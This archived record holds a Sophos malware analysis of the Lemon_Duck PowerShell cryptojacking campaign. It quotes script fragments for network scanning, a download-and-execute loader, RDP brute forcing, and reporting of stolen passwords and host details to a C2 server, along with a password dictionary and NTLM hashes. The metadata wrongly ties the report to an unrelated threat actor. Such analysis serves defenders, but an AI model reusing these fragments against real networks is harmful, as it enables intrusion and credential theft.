{
    "id": "660f77c3-a011-42e1-acdc-b8f61ed7f290",
    "created_at": "2023-01-12T14:58:49.460972Z",
    "updated_at": "2025-03-27T02:05:53.692023Z",
    "deleted_at": null,
    "sha1_hash": "23bc09d53ec78402fa864d11931b1eedd4242d9f",
    "title": "2019-10-01 - Lemon_Duck PowerShell malware cryptojacks enterprise networks",
    "authors": "",
    "file_creation_date": "2022-05-28T16:51:48Z",
    "file_modification_date": "2022-05-28T16:51:48Z",
    "file_size": 3566935,
    "plain_text": "# Lemon_Duck PowerShell malware cryptojacks enterprise networks\n\n**[news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/](https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/)**\n\nOctober 1, 2019\n\nSophosLabs are monitoring a significant spike in crypto mining attacks, which spread quickly\nacross enterprise networks. Starting from a single infection, these attacks use a variety of\nmalicious scripts that, eventually, turn an enterprise’s large pool of CPU resources into\nefficient cryptocurrency mining slaves.\nThe threat actors behind these campaigns have been using an array of advanced\ntechniques, including fileless script execution, leveraging open source security tools for\nnefarious purposes, and abuse of exploitable vulnerabilities to rapidly spread laterally to\nother machines within the same network.\n\nIn its latest iterations, the threat actor has begun to employ the use of EternalBlue exploits to\npropagate laterally to other machines in the same network. Some of the malicious scripts use\n[the term “$Lemon_Duck” as a variable, so we (and a few other](https://www.sentinelone.com/blog/eternalblue-and-the-lemon-duck-cryptominer-attack/) [companies who have](https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/)\ncontemporaneously blogged about this same threat actor) have started to refer to these\nattackers as the Lemon_Duck PowerShell campaign.\n\nIn this post, we’ve turned our attention to what appears to be an organized campaign run by\nattackers who methodically and consistently upgrade their attack scripts with new offensive\ntechniques. Most of the offensive modules used in this script are sourced from open source\nrepositories; The malicious scripts maintain their persistence on infected Windows machines\nusing Scheduled Tasks.\n\n\n-----\n\n### Target selection for crypto mining\n\nThis campaign randomly generates IP addresses for targeting, and port-scans for listening\nservices on specific port numbers, such as 445/TCP (SMB), 1433/TCP (MS-SQL server), or\n65529/TCP (A port used by a machine that has been previously compromised by this same\nthreat actor).\n\nOnce the script gets a response from the remote machine, it probes the IP address for the\nEternalBlue SMB vulnerability or performs a brute-force attack against the MS-SQL service\nin an attempt to compromise the machine. Machines with listening ports open on 65529/TCP\nhave previously been compromised by this or another threat actor using a similar script.\n\nThis section of the malicious script contains the logic by which it randomly generates target\nIP addresses:\n\n\n-----\n\n```\nfunction getipaddrs{\n  write-host \"Get ipaddress...\"\n  $allip = @()\n  [string[]]$ipsub =\n@('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6',\n  $regex =\n[regex]\"\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\"  $regex.Matches((ipconfig /all))\n| ForEach-Object {{{}}\n    if ($allip -notcontains $_.Value)\n    { $allip {{+= $_.Value }}}\n  }\n  $regex.Matches((ipconfig /displaydns)) | ForEach-Object {{{}}\n    if ($allip -notcontains $_.Value)\n    { $allip {{+= $_.Value }}}\n  }\n  $regex.Matches((netstat -ano)) | ForEach-Object {{{}}\n    if ($allip -notcontains $_.Value)\n    { $allip {{+= $_.Value }}}\n  }  foreach($IP in $allip)\n  {{{}}\n    if ($IP.StartsWith(\"127.\") -or ($IP -match '25\\d.') -or ($IP match '24\\d.') -or $IP.StartsWith(\"0.\") -or $IP.StartsWith(\"169.254\") -or $IP eq '1.0.0.127')\n    {{{}}\n    }else{\n      $iptemp = $ip.Split(\".\")\n      $SubnetIP = $iptemp[0] \".\"  $iptemp[1] \".\"  $iptemp[2]\n      if ($ipsub -notcontains $SubnetIP)\n      { $ipsub = @($SubnetIP) + $ipsub}\n    }\n  }\n  try{\n    $NetObject = New-Object Net.WebClient\n    $wlanip = $NetObject.DownloadString(\"https://api.ipify.org/\") \n    $wlaniptemp = $wlanip.Split(\".\")\n    $wlansub = $wlaniptemp[0] \".\"  $wlaniptemp[1] \".\"  $wlaniptemp[2]\n    if($ipsub -notcontains $wlansub)\n    { $ipsub += $wlansub }      \n  }catch\n  try{\n    $ipaddress = [System.Net.DNS]::GetHostByName($null).AddressList  \n    $localip = @()\n    Foreach ($ip in $ipaddress)\n    {{{}}\n      $localip += $ip.IPAddressToString\n      $intiptemp = $ip.IPAddressToString.Split(\".\")\n      if($intiptemp[0] -ne '127'){\n        $intipsub = $intiptemp[0] \".\"  $intiptemp[1] \".\"  $intiptemp[2]\n        if($ipsub -notcontains $intipsub)\n        { $ipsub += $intipsub }\n      }\n    }\n\n```\n\n-----\n\n```\n  }catch\n  for($i=0; $i -lt 30; $i++){\n    try{\n      $ran_ipsub = \"\"(1(Get-Random -Maximum 254))\".\"(1+(Get-Random Maximum 254))\".\"(1+(Get-Random -Maximum 254))\n      if($ipsub -notcontains $ran_ipsub){\n        $ipsub = \"\"(1+(Get-Random -Maximum 254))\".\"(1+(Get-Random Maximum 254))\".\"(1+(Get-Random -Maximum 254))\n      }\n    }catch\n  }\n  $global:ipaddrs = @()\n  foreach($ipsub2 in $ipsub)\n  {{ { }\n}\n    write-host $ipsub2\n    $global:ipaddrs = 1..254|%{$ipsub2{}\".\"+$_}\n  }\n  $global:ipaddrs = @($global:ipaddrs | Where-Object { $localip -notcontains $_ })\n  write-host \"Get address done!!\"\n}\n\n```\nAnd this portion of the script dictates how the attackers scan for specific listening ports on\nthe targeted computers:\n```\nfunction localscan {\n  Param(\n  [int]$Port = 445\n  )\n  write-host \"scan port $port...\"\n  [string[]]$openips = @()\n  $clients = @\n  $connects = @\n  foreach($ip in $ipaddrs) {\n    try{\n      $client = New-Object System.Net.Sockets.TcpClient\n      $connect = $client.BeginConnect($ip,$port,$null,$null)\n      $connects[}}{{$ip}}{{] = $connect\n      $clients[}}{{$ip}}{{] = $client\n    }catch\n  }\n  Start-Sleep -Milli 3000\n  foreach($ip in $clients.Keys) {\n    if ($clients[}}{{$ip}}{{].Connected) {\n      $clients[}}{{$ip}}{{].EndConnect($connects[}}{{$ip}}{{])\n      $openips += $ip\n    }\n    $clients[}}{{$ip}}{{].Close()\n  }\n  write-host $openips.count\n  return,$openips\n}\n\n```\n\n-----\n\nFinally, the attackers use a password & hash dictionary in an attempt to brute-force a\nMicrosoft SQL server’s “sa” (super admin) account credentials. The script runs through a\nlong list of passwords (including ones that have been used in the past by a variety of threat\ngroups who spread Mirai and other IoT botnet malware. The attackers also use an array of\nNTLM hashes in a “pass the hash” attack.\n\nHere’s the password list:\n```\n\"saadmin\",\"123456\",\"password\",\"PASSWORD\",\"123.com\",\"admin@123\",\"Aa123456\",\"qwer12345\",\n\"999999\",\"Passw0rd\",\"123qwe!@#\",\"football\",\"welcome\",\"1\",\"12\",\"21\",\"123\",\"321\",\"1234\",\n\"123456789\",\"987654321\",\"admin\",\"abc123\",\"abcd1234\",\"abcd@1234\",\"abc@123\",\"p@ssword\",\"\n\"qazwsx\",\"password1\",\"qwerty\",\"baseball\",\"qwertyuiop\",\"superman\",\"1qaz2wsx\",\"fuckyou\",\n\"112233\",\"a123456\",\"123456a\",\"5201314\",\"1q2w3e4r\",\"qwe123\",\"a123456789\",\"123456789a\",\"\n\"abc\",\"abcdefg\",\"sapassword\",\"Aa12345678\",\"ABCabc123\",\"sqlpassword\",\"sql2008\",\"1122334\n\n```\nAnd this is the script’s NTLM hash collection\n\n\n-----\n\n```\n 31d6cfe0d16ae931b73c59d7e0c089c0, 32ed87bdb5fdc5e9cba88547376818d4, 8846f7eaee8fb11\n\"579da618cfbfa85247acf1f800a280a4\",\n\"47bf8039a8506cd67c524a03ff84ba4e\",\"5ae7b89b3afea28d448ed31b5c704289\",\"3f9f5f112da330a\n\"6f12c0ab327e099821bd938f39faab0d\",\"e5ae562ddfaa6b446c32764ab1ebf3ed\",\n\"161cff084477fe596a5db81874498a24\",\"d30c2ef8389ac9e8516baacb29463b7b\",\"bc007082d327778\n\"e45a314c664d40a227f9540121d1a29d\",\"d144986c6122b1b1654ba39932465528\",\"f4bb18c1165a892\n \"570a9a65db8fba761c1008a51d4c95ab\",\"e1a692bd23bde99b327756e59308b4f8\",\n\"a87f3a337d73085c45f9416be5787d86\",\"00affd88fa323b00d4560bf9fef0ec2f\",\"31fc0dc8f7dfad0\n \"69943c5e63b4d2c104dbbcc15138b72b\",\n\"588feb889288fb953b5f094d47d1565c\",\"bcdf115fd9ba99336c31e176ee34b304\",\"3dbde697d71690a\n\"7a21990fcd3d759941e45c490f143d5f\",\"579110c49145015c47ecd267657d3174\",\"af27efb60c7b238\n\"e8cd0e4a9e89eab931dc5338fcbec54a\",\n\"6920c58d0df184d829189c44fafb7ece\",\"3fa45a060bd2693ae4c05b601d05ca0c\",\"ba07ba35933e5bf\n\"e84d037613721532e6b6d84d215854b6\",\"2f2d544c53b3031f24d63402ea7fb4f9\",\n\"328727b81ca05805a68ef26acb252039\",\"259745cb123a52aa2e693aaacca2db52\",\"c22b315c040ae6e\n\"162e829be112225fedf856e38e1c65fe\",\"209c6174da490caeb422f3fa5a7ae634\",\"f9e37e83b83c47a\n \"b3ec3e03e2a202cbd54fd104b8504fef\",\"4ed91524cb54eaacc17a185646fb7491\",\n\"aa647b916a1fad374df9c30711d58a7a\",\"a80c9cc3f8439ada25af064a874efe2d\",\"13b29964cc2480b\n \"e19ccf75ee54e06b06a5907af13cef42\",\n\"30fcaa8ad9a496b3e17f7fbfacc72993\",\"41630abb825ca50da31ce1fac1e9f54d\",\"f56a8399599f1be\n\"f2477a144dff4f216ab81f2ac3e3207d\",\"e6bd4cdb1e447131b60418f31d0b81d6\",\"b9f917853e3dbf6\n\"152efbcfafeb22eabda8fc5e68697a41\",\n\"5835048ce94ad0564e29a924a03510ef\",\"2d20d252a479f485cdf5e171d93985bf\",\"320a78179516c38\n\"72f5cfa80f07819ccbcfb72feb9eb9b7\",\"f67f5e3f66efd7298be6acd32eeeb27c\",\n\"1c4ecc8938fb93812779077127e97662\",\"ad70819c5bc807280974d80f45982011\",\"a836ef24f0a5296\n\"36aa83bdcab3c9fdaf321ca42a31c3fc\",\"acb98fd0478427cd18949050c5e87b47\",\"85deeec2d12f917\n \"a4141712f19e9dd5adf16919bb38a95c\",\"e7380ae8ef85ae55bdceaa59e418bd06\",\n\"81e5f1adc94dd08b1a072f9c1ae3dd3f\",\"71c5391067de41fad6f3063162e5eeff\"\n\n```\nSuffice to say, if you run a public-internet-facing MS-SQL server, and you’re using one of\nthese passwords, if your machine isn’t already compromised, it’s only a matter of time before\nit will be.\n\n### The Lemon_Duck kill-chain\n\n\n-----\n\nUsing the Windows Scheduled Tasks mechanism, the malicious scripts download and\nexecute a fresh copy of the malicious script at one-hour intervals. The initial downloaded\nscript performs validation of itself using a hardcoded hash before it executes. If that\nsucceeds, the script downloads other payloads: a coin miner and an exploitation module.\n\nThis section of the script validates the checksum:\n```\n$tm1='$Lemon_Duck=''_T'';\n$y=''_U'';$z=$y{}''p''{}'''$v''';\n$m=(New-Object System.Net.WebClient).DownloadData($y); // Downloaded SHA should be\nequal to 'd8109cec0a51719be6f411f67b3b7ec1'\n[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach}\n{{$s+=$_.ToString(''x2'')};\nif($s-eq''d8109cec0a51719be6f411f67b3b7ec1''){\nIEX(-join[char[]]$m)\n}\n\n```\nThe $Lemon_Duck variable stores the filename of the task, and passes it to the commandand-control server in the User-Agent string. If everything checks out at this phase, the script\nbegins to download the payloads.\n\n### Threat propagation and lateral spread\n\n\n-----\n\nThe script also attempts to propagate itself laterally, using the initially infected machine as a\nfoothold into the rest of the network. To do this, it engages in a variety of methods, including\nthe use of:\n\nEternalBlue: Compromise through SMB exploitation (patch your boxes!)\nUSB & Network Drives: The script writes malicious Windows *.lnk shortcut files &\nmalicious DLL files to removable storage connected to infected machines, and to\nmapped network drives (CVE-2017-8464)\nStartup files: The script writes files to startup locations on the Windows filesystem\n(such as the Start Menu’s Startup folder) to execute during reboot.\nMS-SQL Server brute-forcing – The script tries a variety of (really bad) passwords that\nmight be used by the SQL Server “SA” user account.\nPass the Hash attack – Leverages the NTLM hashes from the table shown above\nExecution of malicious commands on remote machines using WMI\nRDP Bruteforcing\n\nIn some of these attempted exploits, the script also creates one or more Scheduled Tasks to\nlaunch malicious scripts several minutes after the initial compromise. These tricks may be a\nrudimentary, ham-fisted attempt to evade behaviour-based security products. These types of\nsecurity tools track the sequence and timing of events to identify attacks in progress and,\ntheoretically, block an attack once a certain threshold of suspicious commands is issued\nwithin a short timeframe.\n\nOnce new scripts are downloaded from the malicious C&C server, the newer scripts remove\nthe Scheduled Tasks entries created during the initial exploitation. Here are some examples\nof the propagation methods in use by this threat actor:\n\n**EternalBlue: The attacker’s scan machines that respond on 445/TCP to see if they are**\nsusceptible to the EternalBlue vulnerability using a tool called PingCastle.\n\n\n-----\n\nThe PingCastle EternalBlue vulnerability scanner\nMachines found to be vulnerable to this exploit are then attacked using EternalBlue. The\nattack script also determines whether the vulnerable machine is running Windows 7 or older,\nor Windows 8 or newer versions.\n```\ntry{\n  write-host \"start eb scanning...\"\n  $vul=[PingCastle.Scanners.m17sc]::Scan($currip) // scan for vulnerable IP\n  if($vul{{) { }\n}\n    write-host \"$currip seems eb vulnerable...\"\n    $res = eb7 $currip $sc      //targeting win7 & older version\n    if($res) {\n      write-host \"$currip eb7 got it!!!\"\n    } else {\n      $res = eb8 $currip $sc    //Windows 8, 10 & 2012\n      if($res) {\n        write-host \"$currip eb8 got it!!!\"\n      }\n    }\n  }\n}catch\n\n```\nAfter the attack script determines the version of the attack it will use, it launches the “SMB\nExploitation Module” shown below.\n\n\n-----\n\nEtrernalBlue attack code from the Lemon_Duck attack\n**LNK Remote Code Execution: The threat actors behind Lemon_Duck introduced a**\nWindows shortcut *.lnk exploitation component in a recent update. The component exploits\nthe CVE-2017-8464 vulnerability to spread by copying the malicious code to removable USB\nmass storage devices or network drives.\n\nThe script writes both a 32- and 64-bit version of a malicious DLL component, along with with\nwith the corresponding *.lnk files, to the USB or network drive. When the user opens this\ndrive in Windows Explorer or any other application that parses the .lnk Shortcut file, the\nshortcut executes the malicious DLL component.\n\n\n-----\n\nThe USBLNK component can spread to either FAT32 or NTFS file shares or removable\nstorage devices\nThe script also creates a file named “UTFsync inf_data” – (file_location) as a reference\nmarker to confirm that the drive is already infected with *.lnk & *.dll component. The\npresence of this file confirms the drive is already infected, so they skip this drive from\ninfecting again.\n\n**PassTheHash Attack: The script verifies the user account privileges. If the user has**\nadministrator privileges, then the script invokes Dave Kennedy’s [PowerDump module and](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1)\nBenjamin Delpy’s [Mimikatz to dump all the NTLM hashes, Username, Password, and domain](https://github.com/gentilkiwi/mimikatz)\ninformation. The script later uses those credentials to upload the malicious script files,\nfollowed by associated batch or *.lnk file, to the %startup% folder on any remote machines it\ncan access in the network, or execute the PowerShell code remotely using WMI.\n\n\n-----\n\n**[PowerDump Module: This module looks very similar to an open source script used for](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1)**\npenetration testing and features two additional open-source scripting tools.\n\nThe malware uses the credentials harvested using Mimikatz to invoke the following\nPowerShell modules originally published by Kevin Robertson.\n\n[“Invoke-SE” – to execute the malicious batch command in the remote machine.](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1)\n[“Invoke-SMBC” – “List” the IPC$ shares of all user, which are maintained by the SMB.](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBClient.ps1)\nIt performs three different operations “List”, “Put” and “Delete”.\n\n\n-----\n\nThe malicious script invokes several open-source penetration testing tool PowerShell scripts\n**MS-SQL server brute-forcing: The script portscans active IP addresses and enumerates**\nany machine with an open port 1433/TCP, the port used by the Microsoft SQL service, and\nthen engages in a brute-force attack against the “SA” user account, using the list of the\npasswords shown above, along with any password collected locally from the machine using\nMimikatz.\n\nUpon a successful compromise of the MS-SQL server account, the script uses the\nsqlserver.exe process to execute malicious commands against other machines.\n\nThe Lemon_Duck MS-SQL server attack code\n**RDP brute-forcing:**\n\n\n-----\n\nThe RDP module scans for open servers listening on the default RDP port 3389/TCP and will\nattempt to login with the “administrator” user name. The script will cycle through a list of\nhardcoded passwords using the “freerdp” open-source utility.on successful login, the\nmalicious command is executed in the machine.\n```\nforeach($currip in $rdp_portopen[1]) {\n              $currip\n              if (($old_portopen -notcontains $currip) -and ($currip.length\n-gt 6)){\n                   write-host \"start rdp scanning...\"\n                   foreach($password in $allpass){\n                        write-host \"Try pass:$password\"\n                        $flag = (new-object\nRDP.BRUTE).check($exepath,$currip,\"administrator\",$password,$false)\n                        if($flag){\n                             write-host \"SUCC!!\"\n                             $brute = new-object RDP.BRUTE\nif($brute.check($exepath,$currip,\"administrator\",$password,$true)){\n                                  (New-Object\nNet.WebClient).DownloadString($log_url+'/report.json?\ntype=rdp&ip='+$currip+'&pass='+$password+'&t='+$t)\n                                  [RDP.CMD]::runCmd($rdp_code)\n                                  write-host \"Try to run\ncommand!!\"\n                             }\n                             start-sleep 10\n                             $brute.exit()\n                             break;\n                        }\n                   }\n              }\n          }\n\n```\n\n-----\n\nRDP Bruteforce Launching code\nIf the machine is been compromised with any of the above methods, the script modifies the\nWindows Firewall settings to open port 65529/TCP. It uses this indicator as a marker for the\nmalicious script to identify that the machine is already compromised, so it will avoid reusing\nthe exploitation modules on those machines.\n\nThis exploitation code runs continuously, with a 5-minute pause, every time it generates a\nnew random IP address list. The script scans for the SMB & MS-SQL services to\ncompromise the new machines. It also builds profiling information about the machine and\npasses it to its command-and-control server every time it runs this code.\n\n**Installation Tracking C2: This module only runs the first time a machine becomes**\ncompromised. This usually happens at the end of the kill chain, after executing all the\ndownloaded modules for local exploitation, lateral movement, and the actual mining script.\nThis module reports the machine profile back to its C2 server along with the status of each\nexecuted module.\n\n\n-----\n\n```\nwrite host reporting \n     try{\n          $mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where\n{$_.ipenabled -EQ $true}).Macaddress | select-object -first 1\n          $guid = (get-wmiobject Win32_ComputerSystemProduct).UUID\n          $comp_name = $env:COMPUTERNAME\n          $wf = test-path $env:tmp\\wfreerdp.exe // RDP utility \n          $mf = test-path $env:tmp\\mimi.dat // mimikatz\n          (New-Object Net.WebClient).DownloadString($log_url+'/log.json?\nV=0.1&ID='+$comp_name+'&GUID='+$guid+'&MAC='+$mac+'&retry='+$retry+'&pc1='+$portopen[1\n($getpasswd -join \"^^\")+'&wf='+[Int]$wf+'&mf='+[Int]$mf)\n       }catch{}\n\n```\n**Continuous Monitoring C2: An infected machine will continuously send reports back to the**\nC2 server with the latest status of exploitation and mining modules. This module is executed\nafter all the payload script modules have run. Among the parameters sent back to the C2\nserver are details about the compromised user accounts, machine configuration, user\nprivilege and exploitation or mining payloads status.\n```\nhxxp://<redacted.com>/report.jsp?ID=HAWKINS-PC&GUID=2D3EC845-35CD-1346-876E96257ADE6A2F&MAC=&OS=6.1.7601&BIT=32&USER=HAWKINSPC$&DOMAIN=WORKGROUP&D=&CD=Standard%20VGA%20Graphics%20Adapter&P=1&FI=0&FM=0&IF=0&MF=\nParamaters $comp_name = Computername\n$guid = machine UUID\n$mac = mac address of the machine\n$os = installed OS version\n$bit = 32 or 64 bit architecture\n$user = username\n$domain = User Domain\n$uptime = system uptime\n$card = Installed Graphic Card Name \n$if_ = Exploit & threat progration module \n$mf_ = active 32 or 64 bit mining module\n$drive = removable & network drive information\n$timestamp = Date in UFormat\n$isA = If AMD Radeon graphic Card Installed & 64 bit machine\n$permit - Is administrator\nFI & IF - Confirm the threat propgation module is executed and running active\nFM & MF - Confirm mining module executed and running active\n&HR - Miner Hashrate information \n\n### Threat Prevalence\n\n```\nSophosLabs has monitored this malware communicating with its network and built a\ndatabase of compromised machines. Based on the compromised machine count in the\ntelemetry, we suspect that the attacks may have originated in Asia, but have spread to every\ncontinent.\n\n\n-----\n\nInfected machines around the world, geolocated by their IP address\n\nPercentages of the total number of Lemon_Duck infected endpoints, separated by countrycode geolocation of the IP addresses\n\n## Detection Coverage\n\n\n-----\n\nSophos endpoint products will detect elements of the Lemon_Duck PowerShell components\nusing some of the following definitions.\n\nHPmal/PowDld-B – Core Miner Component.\nMal/PshlJob-A – Old campaign tasks files + Mssql brute-force task files.\nMal/MineJob-C – task files created by Eternal Blue Exploitation.\nMal/MineJob-B – Task file persistence.\n\nSophos Managed Threat Response (MTR) detects and neutralizes Techniques, Tactics and\nProcedures (TTPs) utilized by attackers throughout this report. These include but are not\nlimited to PowerShell executions and download string IEX calls, brute force failed logins,\nstart-up folder and scheduled task persistence, CVE-2017-8464, Open TCP 1433, pass-thehash, and other malicious techniques.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-01 - Lemon_Duck PowerShell malware cryptojacks enterprise networks.pdf"
    ],
    "report_names": [
        "2019-10-01 - Lemon_Duck PowerShell malware cryptojacks enterprise networks.pdf"
    ],
    "threat_actors": [
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535529,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653756708,
    "ts_modification_date": 1653756708,
    "files": {
        "pdf": "https://archive.orkl.eu/23bc09d53ec78402fa864d11931b1eedd4242d9f.pdf",
        "text": "https://archive.orkl.eu/23bc09d53ec78402fa864d11931b1eedd4242d9f.txt",
        "img": "https://archive.orkl.eu/23bc09d53ec78402fa864d11931b1eedd4242d9f.jpg"
    }
}